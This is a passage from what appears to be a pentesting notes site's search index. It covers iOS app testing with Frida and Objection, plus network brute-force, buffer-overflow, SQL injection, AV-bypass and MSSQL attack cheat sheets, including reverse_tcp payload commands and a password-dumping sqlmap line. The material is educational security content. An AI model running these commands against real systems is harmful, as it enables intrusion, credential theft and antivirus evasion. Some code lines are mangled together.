jailbreak.</p>"},{"location":"Pentesting/IOS/setting-up-frida%2Bobjection/#ipa-file","title":"IPA File","text":"<p>It is a binary file that runs on iOS devices.</p>"},{"location":"Pentesting/IOS/setting-up-frida%2Bobjection/#mobsf","title":"MobSF","text":"<p>Mobile Security Framework (MobSF) is an automated, open-source, all-in-one mobile application (Android/iOS/Windows) pen-testing framework capable of performing static, dynamic and malware analysis.</p>"},{"location":"Pentesting/IOS/setting-up-frida%2Bobjection/#fireprint","title":"Fireprint","text":"<p>The fingerprint is a python based tool for finding misconfigured Firebase databases used in Android or iOS applications. Just drag and drop your apk/ipa files to this script and find if there is any misconfigured Firebase database is exists.</p>"},{"location":"Pentesting/IOS/setting-up-frida%2Bobjection/#installing-frida","title":"Installing Frida","text":"<p>a.  We need to install Frida first to dump the IPA file. to install Frida simple execute following command in Linux box. You can use windows as well. I've already installed these tools.</p> <p>sunil@ubuntu:~$ pip install frida-tools</p> <p></p> <p>b. To check the installed frida version use sunil@ubuntu:~$ frida --version</p> <p></p> <p>c. To install the Objection use pip install objection in the terminal. the use of objection we will see in the next post its mainly used for keychain dump, cookies dump, SSL pinning bypass, root/jailbreak-detection bypass and so more. Actually, the objection does the automated task while in Frida we need to do manually by writing the custom Javascript. So it's very handy to use for the pentester.</p> <p>I'll show all this in the upcoming Blog Post.</p> <p>As I have already installed so its showing requirement already satisfied.</p> <p>\\</p> <p>d. To verify the installed version using the following command.    </p> <p>sunil@ubuntu:~$ objection version</p> <p></p> <p>e. So After installing Frida-client on the machine, you need to install the Frida agents in the iDevice.</p> <p>Just Open Cydia (Which is nothing but the play store for iOS) and add the repo http://build.re </p> <p></p> <p>f. Click on Add source.</p> <p></p> <p>g.Search for the frida in Cydia. and install it.</p> <p></p> <p>h. After done with installation. take an SSH of the device and execute the command While doing this make sure you connected via USB before using Frida. whenever we use Frida in ios we have to connect via USB. by using the switch -U </p> <p><code>sunil@ubuntu:~$frida-ps -U</code></p> <p>Where -U for USB. Once it's connected it shows all installed application names. we do a lot more with Frida like abuse the application logic by hooking, bypass the SSL pinning, Bypass login pin, enumeration classes, Bypass jailbreak detection and lot more. I'll show all this in the upcoming post on the DVIA app.</p> <p></p> <p>i. After installing all this requirement we need to install the python script which is used to dump/decrypt the iPA file.</p> <p>You can download it from here:  https://github.com/AloneMonkey/frida-ios-dump.git</p>"},{"location":"Pentesting/IOS/setting-up-frida%2Bobjection/#steps-for-installation","title":"Steps for installation","text":"<p>Open the terminal and clone the above Git URL </p> <p></p> <p>Now Go to Directory and Open dump.py file in nano editor.</p> <p></p> <p>Here we need to collect some useful information. Just go to Setting =&gt; wifi and find the IP address. in my case, IP is 192.168.104 in your case it may be different.</p> <p></p> <p>Now open the dump.py file and replace the following things with your values.</p> <pre><code>  **`Password    -  sunil Passwd of idevice`**\n\n  **`PORT          - 22  (Port of SSH)`**\n\n  **`USER          - root`**\n\n  **`HOST          - 192.168.1.104`**\n</code></pre> <p>Do these respective changes and save the file.</p> <p></p> <p>In my case, it looks like.</p> <p>\\</p> <p>Now go to the tool directory and run the tool by using the following command. python3 dump.py --help</p> <p></p> <p>As you see -l switch used to list all packages. **But remember while using this tool you should be connected to the PC via USB. Else it will give you an error**</p> <p>As you can see below by using the switch -l tool fetches all installed app names and respective packages.\\ </p> <p>To decrypt any iOS app just use package name after the dump.py script like</p> <p>** <code>python3 dump.py com.yahoo.rivals</code>**</p> <p>I'm using yahoo rivals app for demo purpose which I downloaded from the app store</p> <p>While executing this command make a sure app which you want to decrypt that should be open on your device otherwise you won't able to decrypt it.\\ \\ You can see the decrypted IPA file present in the tool directory.\\ \\</p> <p></p> <p>Now,  We can use IPA file for reverse engineering and for static analysis using tools like mobsf</p> <p>For reverse engineering, We use tools like Hopper, IDA Pro. I'll write separate posts on these tools where we see how to use them and how we can analyze code to hook the app to bypasses some code restriction using Frida.!!!</p> <p>But for now, I'm showing how we do static analysis of the application using mobsf</p> <p>For this demo, we need to download tool Mobsf.</p> <p>Download this tool by using the link.</p> <p><code>Install using following simple commands.</code></p> <p><code>root@ubuntu:~#git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git</code></p> <p><code>root@ubuntu:~#cd Mobile-Security-Framework-MobSF</code></p> <p><code>root@ubuntu:~#./setup.sh</code></p> <p><code>As we see it start the server on http://0.0.0.0:8000</code></p> <p></p> <p>Open the server address in http://0.0.0.0:8000 in browser and import decrypted IPA file.</p> <p></p> <p>Now just import the IPA file which we decrypted using Frida dump tool and see the result as below.</p> <ul> <li>Basic information about the app and its binary file.</li> <li>Some options to View the Info.plist file.</li> <li>View the strings contained in the app binary.</li> <li>Download a class-dump, if the app was written in Objective-C; if it is written in Swift no class-dump can be created.</li> <li>List all Purpose Strings extracted from the Info.plist which give some hints on the app's permissions.</li> <li>Exceptions in the App Transport Security (ATS) configuration will be listed.</li> <li>A brief binary analysis showing if free binary security features are activated or e.g. if the binary makes use of banned APIs.</li> <li>List of libraries used by the app binary and list of all files inside the unzipped IPA.</li> <li>It is also helpful for finding out firebase credentials if there is any.</li> <li>Also, we can generate a pdf report to analyze all tested results.</li> </ul> <p></p> <p></p> <p></p> <p>Scan For Firebase Database</p> <p>The fingerprint is a python based tool for finding misconfigured Firebase databases used in Android or iOS applications. Just drag and drop your apk/ipa files to this script and find if there is any misconfigured Firebase database is exists.</p> <p>before installing tool we need to install some dependency tools. which are</p> <p>Ref- https://github.com/sahad-mk/Fireprint</p> <pre><code> 1. pip3 install json2html 2. apktool.jar (/tools directory) 3. grep and awk\n</code></pre> <pre><code> \u2022 clone the fireprint repo, git clone https://github.com/sahad-mk/Fireprint \u2022 Give executable permission, chmod +x fireprint.py\n</code></pre> <p>Sample use script - <code>python3 fireprint.py -a test.ipa</code></p> <p>We use the same IPA file for demo purposes.</p> <p>\\ \\ If is there any data found then it will fetch for you. This is very useful when looking for any firebase credentials.\\ \\</p>"},{"location":"Pentesting/IOS/ssl-pinning/","title":"SSL Pinning","text":""},{"location":"Pentesting/IOS/ssl-pinning/#ssl-pinning","title":"SSL Pinning","text":""},{"location":"Pentesting/IOS/ssl-pinning/#ssl-pinning-bypass-for-ios","title":"SSL Pinning bypass for iOS","text":"<p>As I said we need to know the basics or atleast know how SSL pinning is implemented in iOS, here\u2019s a link to the blog which will guide you in implementing SSL pinning in iOS.</p> <p>Let\u2019s come back to bypass part, there are 4 ways to do that:</p> <ol> <li>Frida</li> <li>Objection</li> <li>External application (Cydia)</li> <li>By modifying the IPA file</li> </ol> <p>Let\u2019s move on step by step</p>"},{"location":"Pentesting/IOS/ssl-pinning/#ssl-pinning-bypass-using-frida-for-ios","title":"SSL pinning bypass using Frida for iOS","text":"<p>As you know already about Frida, basically it\u2019s just used for hooking the application.\\ Here basically we need to modify the application in runtime so that\u2019s what Frida is used for, we can use Frida Gadget dynamic library to modify the application during run time, so what we will do is extract the IPA file then modify the binary to load Frida gadget, if we are changing or modifying the IPA file we need to code sign it for the IPA to work, code signing can be done by creating a developer account.</p> <p>Once code signing is done repack the IPA and install the application.\\ Looks complicated? right!\\ Don\u2019t worry objection is here to help you,</p>"},{"location":"Pentesting/IOS/ssl-pinning/#ssl-pinning-bypass-using-objection-for-ios","title":"SSL pinning bypass using objection for iOS","text":"<p>Here it is simple as of android you need to install objection\\ then use the command,</p> <pre><code>$ objection patchipa -s test.IPA -c 0[REDACTED]C\n-s stands for the path to IPA file and \n-c stands for code-signing certificate\n</code></pre> <p>Once done, install the modified application through ifunbox and run the </p> <p></p>"},{"location":"Pentesting/IOS/ssl-pinning/#use-of-external-application","title":"Use of external application","text":"<p>There are some external application such as SSL killswitch, just install it and bypass the SSL. It is as simple as its name, here you need a jailbroken device and remember Xposed framework for android same like that we have Cydia for iOS.\\ So what is Cydia?\\ Cydia installer is a free third-party app installer which is developed for the iOS devices. Think of Apple\u2019s official App Store, this is similar to the app store which means you can download apps, games from the Cydia downloader, but there are many other advanced options that have been included in the Cydia free store, which is more than the official store.\\ Thus, here you can find the \u201cSSL killswitch\u201c, install it and unpin the SSL for the application as you did it in android.</p>"},{"location":"Pentesting/IOS/ssl-pinning/#modifying-the-ipa-file","title":"Modifying the IPA file","text":"<p>Most of the time the above methods should work. If not, this will definitely work, but here you need to know how the IPA application works, there is always an option to use disassemblers to be able to modify the IPA file to bypass any certificate validation. Some of the most common disassemblers are Hopper and IDA. Modifying the IPA will most likely break the signed application and it cannot be installed on an iOS device. Resigning the IPA file will allow you to install the mobile app.</p>"},{"location":"Pentesting/IOS/untitled/","title":"What is iOS and its Structure","text":""},{"location":"Pentesting/IOS/untitled/#what-is-ios-and-its-structure","title":"What is iOS and its Structure","text":""},{"location":"Pentesting/IOS/untitled/#introduction-to-jailbreaking-and-tools","title":"Introduction to Jailbreaking and Tools","text":"<p>A. What is iOS?</p> <p></p> <ul> <li>iOS is a mobile operating system created and developed by Apple Inc. exclusively for iPhone, iPod,iPad &amp; Apple TV</li> <li>Provides multi-tasking (allowing a user to perform more than one computer task)</li> <li>It only allows running Apple signed applications.</li> </ul> <p>B. What is Jailbreaking?</p> <ul> <li>Jailbreak gives full access to the device.</li> <li>We Can say it is the privilege escalation from a normal user to root.</li> <li>Allows installing Apps that are not authorized.</li> <li>Install Application from Cydia which is AppStore for jailbreak Devices.</li> </ul> <p>Types of jailbreak</p> <p>Tethered</p> <ul> <li>Users need to reconnect to their computer every time the device is restarted</li> </ul> <p>Untethered</p> <ul> <li>it's a one-time activity. no need to reconnect.</li> </ul> <p>We will see how to jailbreak in an upcoming blog post.</p> <p>D. iOS Architecture</p> <p></p> <ul> <li>It contains an intermediate layer between the applications and the hardware so they do not communicate directly.</li> <li>it contains four layers *</li> <li>Core OS</li> <li>Core Services</li> <li>Media Services</li> <li>Cocoa Touch</li> </ul> <p>Let us discuss one by one</p> <p>1. Core OS Layer</p> <ul> <li>A layer with which most applications interact.</li> <li>All the iOS technologies are built on the low-level features provided by the Core OS layer.</li> <li>These technologies include Core Bluetooth Framework, External Accessory Framework, Accelerate Framework, Security Services Framework, Local Authorisation Framework, etc.</li> <li>The developer has limited access to this layer. still, the developer has the privileges to access the following frameworks *</li> <li>Accelerate - Big number and DSP calculations</li> <li>External Accessory - Communicate with hardware accessories.</li> <li>Security - Certificates and Cryptography</li> <li>System - Low-level Operating system method</li> </ul>"},{"location":"Pentesting/IOS/untitled/#core-services","title":"Core Services","text":"<ul> <li>The Core Services layer provides an abstraction over the services provided in the Core OS layer.</li> <li>It provides fundamental access to iPhone OS services.</li> <li> <p>Following frameworks available in the cure services layer:</p> </li> <li> <p>Cloudkit Framework - The data can be moved between the app the iCloud using the Cloudkit Framework.</p> </li> <li>Core Foundation Framework - This provides data management and service features for iOS apps.</li> <li>Core Data Framework - The data model of the model view controller app is handled using the Core Data Framework.</li> <li>Address Book Framework - The address book framework provides access to the contacts database of the user.</li> <li>Core Motion Framework - All the motion-based data on the device is accessed using the core motion framework.</li> <li>Healthkit Framework - The health-related information of the user can be handled by this new framework.</li> <li>Core Location Framework - This framework provides the location and heading information to the various apps.</li> <li>Core Location-  GPS, cellular, or wi-fi based location services</li> </ul>"},{"location":"Pentesting/IOS/untitled/#media-services","title":"Media Services","text":"<ul> <li>The Media layer provides multimedia services that you can use within your iPhone.</li> <li>The media layer enables all the graphics, audio, and video technology of the system.</li> <li>Allows the developer to work with photos, videos, audios, animations, graphics-like things.</li> <li>It contains the following frameworks.</li> <li>AVFoundation: Advanced audio and video</li> <li>UIKit Graphics: Designing images and animating the view content.</li> <li>Core Graphics Framework: Support 2-D vector and image-based rendering and is the Native drawing engine for iOS apps.</li> <li>Core Animation: The Core Animation technology optimizes the animation experience of the apps.</li> <li>Core Audio: Low-level audio</li> <li>Media Player: Support audio, video playback &amp; enables the user to use their iTunes library.</li> <li>Core Text: Advanced text layouts and fonts</li> </ul>"},{"location":"Pentesting/IOS/untitled/#cocoa-touch-layer","title":"Cocoa Touch Layer","text":"<ul> <li>Cocoa: Touch layer provides an abstraction layer to expose the various libraries for programming the iPhone, and other IOS devices. </li> <li> <p>As per Apple documentation following frameworks are there:</p> </li> <li> <p>UIKit- UI element, life cycle management, etc</p> </li> <li>Message Kit- Responsible for Email, SMS</li> <li>Address Book- Contact, editing.</li> <li>Event Kit- Alarm, Calendar events, etc.</li> <li>Game Kit- Responsible for gaming activity.</li> <li>iAd- It supports Apple\u2019s advertisement platform</li> <li>Map Kit- Google map, Apple map.</li> <li>Message Kit- Responsible for Email etc </li> </ul>"},{"location":"Pentesting/IOS/untitled/#popular-posts-from-this-blog","title":"Popular posts from this blog","text":"<ul> <li>Setting Up Frida and Objection</li> </ul> <p>Hello All. In this post I'll show how we can setup Frida, Objection, Fireprint Scanner for firebase DB scan, How to dump IPA file to perform Reverse Engineering and Static Analysis using Opensource Tool Mobsf. Also, look at how we use Frida to decrypt iOS files from the iDevice. So Let's Start. </p> <p>Tools Needed: </p> <ol> <li>Frida </li> <li>Frida-dump </li> <li>iDevice </li> <li>PC  </li> <li> <p>Fireprint Let's have a short introduction to the following terms before proceeding further. </p> </li> <li> <p>Frida Frida is a free and open-source dynamic instrumentation toolkit, that allows developers, reverse-engineers, and security researchers to monitor and debug running processes. It also enables programmers, software, and security professionals to execute their own JS scripts into other processes running on </p> </li> <li> <p>Objection It's a runtime mobile exploration toolkit, powered by Frida, built to help you assess the security posture of your mobile applications, without need.</p> </li> </ol>"},{"location":"Pentesting/IOS/untitled/#ios-application-pentesting-blog-by-sunil-kande","title":"iOS Application Pentesting Blog By Sunil Kande","text":"<p>1. What is iOS \\ 2. iOS Architecture \\ 3. What is Jailbreak  \\ 4. How to Jailbreak \\ 5. How to set-up a pen-testing Environment\\ 6. Local Storage Vulnerabilities     a. Plist file      b. Nsuserdefault Storage      c. Keychain      d. Core Data      e. Webkit Caching      f. SQLite Database \\ 7. What is SSL pinning in Mobile \\ 8. How to bypass SSL pinning \\ 9. What is Hooking in iOS \\ 10. Fun with Frida \\ 11. Fun with Objection \\ 12. SSL pinning bypass with Frida &amp; Objection  \\ 13. Jailbreak Detection Bypass using Frida \\ 14. Runtime manipulation \\ 15. Binary Protection  \\ 16. How to decrypt IPA using Frida Script \\ 17. Automation with Objection \\ 18. Side Channel Data Leakage      a. Device Log      b. App Screenshot      c. Pastboard      d. Keystroke Logging       e. Cookies(Binary) \\ 19. Broken Cryptography  \\ 20. Webview issues \\ 21. SSL pinning Bypass Challenges  \\ 22. Network Layer Challenges \\ 23. Sensi</p>"},{"location":"Pentesting/IOS/untitled/#lets-jailbreak-iphoneipad","title":"Let's Jailbreak iPhone/iPad","text":""},{"location":"Pentesting/Network/active-info-gathering/","title":"Active Information Gathering","text":""},{"location":"Pentesting/Network/active-info-gathering/#active-information-gathering","title":"Active Information Gathering","text":""},{"location":"Pentesting/Network/active-info-gathering/#what-is-active-information-gathering","title":"What is Active Information Gathering?","text":"<p>Active information gathering is a proactive process of directly interacting with network systems and devices to collect data and assess their characteristics. This approach involves techniques such as port scanning, service enumeration, and vulnerability scanning to identify open ports, running services, and potential security weaknesses. Active information gathering provides a comprehensive understanding of the network's configuration, topology, and potential attack surface, aiding in security assessments and risk mitigation strategies.</p>"},{"location":"Pentesting/Network/active-info-gathering/#nmap","title":"Nmap","text":"<p>Nmap is a powerful network scanner used for discovering hosts and services on a network. It provides various scanning techniques like TCP SYN scan, TCP connect scan, UDP scan, etc., and can output results in different formats. </p><pre><code>nmap &lt;target_ip&gt;\n</code></pre>"},{"location":"Pentesting/Network/active-info-gathering/#netdiscover","title":"Netdiscover","text":"<p>Netdiscover is a network scanning tool used for discovering active hosts on a network by sending ARP requests and analyzing responses, providing information about IP addresses, MAC addresses, and hostnames. </p><pre><code>netdiscover -r 192.168.1.0/24\n</code></pre>"},{"location":"Pentesting/Network/active-info-gathering/#nikto","title":"Nikto","text":"<p>Nikto is an open-source web server scanner that identifies potential vulnerabilities and misconfigurations in web servers by performing comprehensive tests and analysis. </p><pre><code>nikto -host &lt;target_ip&gt;\n</code></pre>"},{"location":"Pentesting/Network/active-info-gathering/#reference","title":"Reference","text":"<ul> <li>https://sushant747.gitbooks.io/total-oscp-guide/content/active_information_gathering.html</li> </ul>"},{"location":"Pentesting/Network/brute-force/","title":"Brute Force","text":""},{"location":"Pentesting/Network/brute-force/#brute-force","title":"Brute Force","text":""},{"location":"Pentesting/Network/brute-force/#weak-credentials","title":"Weak Credentials","text":""},{"location":"Pentesting/Network/brute-force/#http-brute-force","title":"HTTP Brute Force","text":"<ul> <li>wfuzz POST</li> </ul> <pre><code>wfuzz --hc 404 -c -z list,admin -z file,/root/Documents/SecLists/Passwords/korelogic-password.txt -d \"user=FUZZ&amp;password=FUZ2Z\" http://ip/admin/index.php\n</code></pre> <ul> <li>hydra POST</li> </ul> <pre><code>hydra ip -s 80 http-form-post \"/admin/index.php:user=^USER^&amp;password=^PASS^:Moved Temporarily\" -l admin -P /root/Documents/SecLists/Passwords/korelogic-password.txt -t 20\n</code></pre> <ul> <li>wfuzz NTLM</li> </ul> <pre><code>wfuzz -c --ntlm \"admin:FUZZ\" -z file,/root/Documents/SecLists/Passwords/darkc0de.txt --hc 401 https:///api\n</code></pre> <ul> <li>wfuzz Basic Auth through Proxy</li> </ul> <pre><code>wfuzz -c --hc 404,400,401 -z file,/root/Documents/Audits/Activos/names.txt -z file,/root/Documents/Audits/Activos/names.txt --basic \"FUZZ:FUZ2Z\" -p 127.0.0.1:8080 https:///api/v1/\n</code></pre>"},{"location":"Pentesting/Network/brute-force/#password-cracking","title":"Password Cracking","text":"<ul> <li>zip</li> </ul> <pre><code>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip\n</code></pre> <ul> <li>/etc/shadow</li> </ul> <pre><code>unshadow passwd shadow &gt; passwordsjohn --wordlist=/usr/share/wordlists/rockyou.txt passwords\n</code></pre> <ul> <li>keepass</li> </ul> <pre><code>keepass2john /root/Desktop/NewDatabase.kdb &gt; filejohn -incremental:alpha -format=keepass file\n</code></pre> <ul> <li>Bruteforce Salted</li> </ul> <pre><code>for j in $(cat cipher); do echo $j; for i in $(cat digestion); do /root/Documents/HTB/Hawk/bruteforce-salted-openssl/bruteforce-salted-openssl -t 10 -f /usr/share/wordlists/rockyou.txt -c $j -d $i ../miau.txt -1 2&gt;&amp;1 | grep \"candidate\" ; done ; done\n</code></pre> <pre><code>openssl aes-256-cbc -d -in ../miau.txt -out result.txt -k friends\n</code></pre> <ul> <li>Port 22</li> </ul> <pre><code>hydra -f -V -t 1 -C /usr/share/SecLists-5c9217fe8e930c41d128aacdc68cbce7ece96e4f/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -s 22 $IP ssh\u200b\n</code></pre> <ul> <li>Hydra for login bypass</li> </ul> <pre><code>Hydra for login bypass:hydra http://XXXX http-form-post \"/TARGETPATH/TARGETPAGE.php:user=^USER^&amp;pass=^PASS^:Bad login\" -L users.txt -P pass.txthrydra -C /seclist/tomcat-betterdefaultpasslist http-get://ip:port/manager/htmlhydra -C /root/attacker-framework/SecLists/Passwords/Default-Cr edentials/tomcat-betterdefaultpasslist.txt http-get://ip:8080/manager/html\n</code></pre> <ul> <li>Zip file Bruteforce</li> </ul> <pre><code> fcrackzip -D -v -u -p /usr/share/wordlists/rockyou.txt backup.zip\u200b\n</code></pre> <ul> <li>John</li> </ul> <pre><code> john --wordlist=/usr/share/wordlists/rockyou.txt keepass-hash.txt\u200b\n</code></pre>"},{"location":"Pentesting/Network/buffer-overflow/","title":"Buffer Overflow","text":""},{"location":"Pentesting/Network/buffer-overflow/#buffer-overflow","title":"Buffer Overflow","text":""},{"location":"Pentesting/Network/buffer-overflow/#what-is-buffer-overflow","title":"What is Buffer Overflow?","text":"<p>A buffer overflow occurs when a program attempts to store more data in a buffer, or temporary storage area, than it was designed to hold. This can lead to the excess data overwriting adjacent memory locations, potentially causing the program to behave unpredictably, crash, or even allow attackers to execute malicious code. It's a common security vulnerability that can be exploited by attackers to gain unauthorized access to a system or escalate their privileges.</p>"},{"location":"Pentesting/Network/buffer-overflow/#payload","title":"Payload","text":"<pre><code>payload = \"\\x41\" \\* + + \"\\x90\" \\* 16 + + \"\\x43\" \\*\n</code></pre>"},{"location":"Pentesting/Network/buffer-overflow/#pattern-create","title":"Pattern create","text":"<pre><code>/usr/share/metasploit-framework/tools/exploit/pattern\\_create.rb -l\n</code></pre>"},{"location":"Pentesting/Network/buffer-overflow/#pattern-offset","title":"Pattern offset","text":"<pre><code>/usr/share/metasploit-framework/tools/exploit/pattern\\_offset.rb -l -q\n</code></pre>"},{"location":"Pentesting/Network/buffer-overflow/#nasm","title":"nasm","text":"<pre><code>/usr/share/metasploit-framework/tools/exploit/nasm\\_shell.rb\n</code></pre> <p>nasm &gt; jmp eax</p>"},{"location":"Pentesting/Network/buffer-overflow/#bad-characters","title":"Bad characters","text":"<pre><code>badchars = (\n\n\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"\n\n\"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"\n\n\"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"\n\n\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\n\n\"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\n\n\"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"\n\n\"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"\n\n\"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"\n\n\"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"\n\n\"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"\n\n\"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"\n\n\"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"\n\n\"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"\n\n\"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"\n\n\"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"\n\n\"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\" )\n</code></pre>"},{"location":"Pentesting/Network/buffer-overflow/#buffer-overflow_1","title":"Buffer Overflow","text":"<ul> <li> <p>Determine length of overflow trigger w/ binary search \"A\"x1000</p> </li> <li> <p>Determine exact EIP with pattern_create.rb &amp; pattern_offset.rb</p> </li> <li> <p>Determine badchars to make sure all of your payload is getting through</p> </li> <li> <p>Develop exploit</p> </li> <li> <p>Is the payload right at ESP</p> </li> <li> <p>JMP ESP</p> </li> <li> <p>Is the payload before ESP</p> </li> <li> <p>sub ESP, 200 and then JMP ESP</p> </li> </ul> <p>or</p> <ul> <li>call [ESP-200] <pre><code>msfvenom -a x86 --platform windows/linux -p something/shell/reverse\\_tcp lhost=x.x.x.x lport=53 -f exe/elf/python/perl/php -o filename\n</code></pre></li> </ul> <p>Make sure it fits your payload length above</p> <p>Gain shell, local priv esc or rooted already?</p>"},{"location":"Pentesting/Network/cheatsheet-short/","title":"CheatSheet","text":""},{"location":"Pentesting/Network/cheatsheet-short/#cheatsheet","title":"CheatSheet","text":""},{"location":"Pentesting/Network/cheatsheet-short/#scp","title":"SCP","text":"<p>Secure Copy (scp) Cheatsheet</p> <ul> <li>Copy remote file to local host  </li> <li>Copy local file to remote host  </li> <li>Copy local directory to remote directory  </li> <li>Copy a file from one remote host to another  </li> <li>Improve scp performance (use blowfish)  </li> </ul>"},{"location":"Pentesting/Network/cheatsheet-short/#sql-injection","title":"SQL Injection","text":"<p>Union Based SQL Injection </p><pre><code>\u200b' or 1=1#\u200b1' \nORDER BY 10#\u200b1' UNION SELECT version(),2#\u200b1' \nUNION SELECT version(),database()#\u200b1' \nUNION SELECT version(),user()#\u200b1' \nUNION ALL SELECT table_name,2 from information_schema.tables#\u200b1' \nUNION ALL SELECT column_name,2 from information_schema.columns where table_name = \"users\"#\u200b1' UNION ALL SELECT concat(user,char(58),password),2 from users\n</code></pre> <pre><code>\u200b\u200bsqlmap --url=\"\" -p username --user-agent=SQLMAP --threads=10 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs\n</code></pre>"},{"location":"Pentesting/Network/cheatsheet-short/#av-bypass","title":"AV bypass","text":"<p>1. Generate executable using Veil. 2. In msfconsole setup psexec with relevant payload </p><pre><code>(windows/meterpreter/reverse_tcp)\n</code></pre> then follow this steps: <pre><code>\u200bmsf &gt; use exploit/windows/smb/psexec\nmsf exploit(psexec) &gt; set RHOST ip RHOST =&gt; ip\nmsf exploit(psexec) &gt; set SMBUser userSMBUser =&gt; user\nmsf exploit(psexec) &gt; set SMBPass passSMBPass =&gt; pass\nmsf exploit(psexec) &gt; set EXE::Custom /root/Desktop/Misc/Veil-master/payload.exeEXE::Custom =&gt; /root/Desktop/Misc/Veil-master/payload.exe\nmsf exploit(psexec) &gt; exploit\n</code></pre>"},{"location":"Pentesting/Network/cheatsheet-short/#apache-ssl","title":"Apache SSL","text":"<p>1. Enabling Self signed certificates on local website1.  2. Install OpenSSL\u200bsudo apt-get install openssl\u200b2. 3. Run the following command to generate the self signed SSL certificates: </p><pre><code>\u200bsudo openssl req -x509 -nodes -days 1095 -newkey rsa:2048 -out /etc/ssl/certs/server.crt -keyout /etc/ssl/private/server.key\u200b3. \n</code></pre> 4. Enable SSL for Apache\u200bsudo a2enmod ssl\u200b4. 5. Put the default-ssl site available creating a symbolic link: <pre><code>\u200bsudo ln -s /etc/apache2/sites-available/default-ssl.conf /etc/apache2/sites-enabled/000-default-ssl.conf\u200b5\n</code></pre> 6. Edit the file default-ssl.conf <pre><code>\u200bsudo nano /etc/apache2/sites-enabled/000-default-ssl.conf\u200bChange\n</code></pre> the following lines to point to the  <pre><code>certs:\u200bSSLCertificateFile /etc/ssl/certs/server.crtSSLCertificateKeyFile /etc/ssl/private/server.key\u200b6\n</code></pre> 7. Restart Apache <pre><code>\u200bsudo /etc/init.d/apache2 restart\n</code></pre>"},{"location":"Pentesting/Network/cheatsheet-short/#more-information","title":"More Information","text":"<ul> <li>https://hallard.me/enable-ssl-for-apache-server-in-5-minutes/</li> <li>https://www.sslshopper.com/article-how-to-create-and-install-an-apache-self-signed-certificate.html</li> <li>http://www.akadia.com/services/ssh_test_certificate.html</li> <li>https://www.sslshopper.com/apache-server-ssl-installation-instructions.html</li> </ul>"},{"location":"Pentesting/Network/cheatsheet-short/#attacking-ms-sql","title":"Attacking MS-SQL","text":"<p>Attacking MSSQL with Metasploit</p> <ul> <li>Enumerate MSSQL Servers on the network: <pre><code>\u200bmsf &gt; use auxiliary/scanner/mssql/mssql_pingnmap -sU --script=ms-sql-info ip ip\n</code></pre></li> <li>Discover more servers using \"Browse for More\" via Microsoft SQL Server Management Studio.</li> <li>Bruteforce MSSQL Database: <pre><code>\u200bmsf auxiliary(mssql_login) &gt; use auxiliary/scanner/mssql/mssql_login\n</code></pre></li> <li>Enumerate MSSQL Database: <pre><code>\u200bmsf &gt; use auxiliary/admin/mssql/mssql_enum\n</code></pre></li> <li>Gain shell using gathered credentials: <pre><code>\u200bmsf &gt; use exploit/windows/mssql/mssql_payload\nmsf exploit(mssql_payload) &gt; set PAYLOAD windows/meterpreter/reverse_tcp\u200b\n</code></pre></li> </ul>"},{"location":"Pentesting/Network/cheatsheet-short/#bash-scripting","title":"Bash Scripting","text":"<p>Simple Bash Scripting Cheatsheet</p> <ul> <li><code>ctrl +  y</code>: Navigate to the previous page in nano.  </li> <li><code>ctrl +  w</code>: Find/search for a specific term in nano.  </li> <li><code>ctrl +  k</code>: Cut the current line of text in nano.  </li> <li><code>ctrl +  x</code>: Exit the nano editor.  </li> <li><code>touch file</code>: create a new text file named \"file\".    </li> <li><code>file.ifconfig &gt; tmp</code>: create an empty file named \"file.ifconfig\" and redirect its output to \"tmp\".  </li> <li><code>nano file</code>: open the nano editor with the file named \"file\".  </li> <li><code>ifconfig &gt; tmp</code>: execute the ifconfig command and save its output to the file \"tmp\".  </li> <li><code>echo &gt;&gt; tmp; ping google.com -c3 &gt;&gt; tmp</code>: append the output of the \"ping\" command to the file \"tmp\".  </li> <li><code>cat file</code>: display the contents of the file \"file\".  </li> <li><code>more file</code>: display the contents of the file \"file\" one page at a time.  </li> <li><code>head file</code>: display the first 10 lines of the file \"file\".  </li> <li><code>head -15 file</code>: display the first 15 lines of the file \"file\".  </li> <li><code>tail file</code>: display the last 10 lines of the file 